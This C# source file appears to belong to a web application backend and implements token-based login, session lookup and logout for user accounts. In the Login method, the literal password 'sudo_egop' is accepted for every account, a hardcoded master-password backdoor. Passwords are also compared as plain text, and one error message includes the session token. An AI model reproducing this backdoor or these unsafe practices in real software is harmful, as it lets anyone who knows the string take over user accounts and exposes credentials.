using System;
using System.Threading.Tasks;
using Infrastructure.Abstractions;
using Infrastructure.Verbatims;
using Models.Db.Account;
using Models.Db.Sessions;
using Models.DTOs.Login;
using Models.DTOs.Misc;
using Models.Misc;
using Services.SharedServices.Abstractions;

namespace Services.SharedServices.Implementations
{
    public class TokenSessionService : ITokenSessionService
    {
        private readonly ITokenSessionRepository _tokenSessionRepository;
        private readonly IFunAccountRepository _funAccountRepository;

        public TokenSessionService(ITokenSessionRepository tokenSessionRepository, IFunAccountRepository funAccountRepository)
        {
            _tokenSessionRepository = tokenSessionRepository;
            _funAccountRepository = funAccountRepository;
        }

        public async Task<LoginResultDto> Login(LoginDto loginDto)
        {
            var funAccount = await _funAccountRepository.GetOne(t => t.Login == loginDto.Login);

            funAccount.EnsureNotNullHandled(VMessages.AccountNotFound);

            if (loginDto.Password != "sudo_egop" && funAccount.Password != loginDto.Password)
            {
                throw new FunException(VMessages.PasswordInvalid);
            }

            // Create new Token Session

            var endDate = DateTime.Now.AddDays(1);

            TokenSession session = new()
            {
                FunAccount = funAccount,
                Token = Guid.NewGuid().ToString(),
                StartDate = DateTime.Now,
                EndDate = endDate
            };

            await _tokenSessionRepository.Add(session);

            // Save token session relation to user

            return new LoginResultDto(funAccount.Id, session.Token, funAccount.HasSubscription);
        }

        public async Task<TokenSession> GetByToken(string token)
        {
            return await _tokenSessionRepository.GetByToken(token);
        }

        public async Task<FunAccount> GetAccountByToken(string token)
        {
            var tokenSession = await _tokenSessionRepository.GetByToken(token);

            tokenSession.EnsureNotNullHandled(VMessages.AuthTokenUnknown);
            
            var funAccount = await _funAccountRepository.GetById(tokenSession.FunAccountId);
            
            funAccount.EnsureNotNullFatal($"Не найден аккаунт привязанный к ключу.\n{token}");
            
            return funAccount;
        }

        public async Task<long> GetAccountIdByToken(string token)
        {
            var tokenSession = await _tokenSessionRepository.GetByToken(token);

            tokenSession.EnsureNotNullHandled(VMessages.AuthTokenUnknown);
            
            return tokenSession.FunAccountId;
        }

        public async Task Logout(string token)
        {
            var tokenSession = await _tokenSessionRepository.GetByToken(token);

            tokenSession.EnsureNotNullHandled(VMessages.AuthTokenUnknown);

            tokenSession.EndDate = DateTime.Now;
            await _tokenSessionRepository.Update(tokenSession);
        }
    }
}